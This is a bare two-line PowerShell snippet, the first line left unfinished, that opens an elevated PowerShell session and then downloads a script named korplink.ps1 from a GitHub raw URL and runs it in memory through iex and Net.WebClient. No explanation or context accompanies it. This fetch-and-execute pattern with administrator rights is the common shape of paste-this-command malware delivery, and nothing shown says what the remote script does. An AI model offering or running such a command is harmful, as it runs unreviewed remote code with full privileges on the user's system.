powershell -Command "Start-Process PowerShell -Verb RunAs 
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/vivek030/korplink/main/korplink.ps1')"
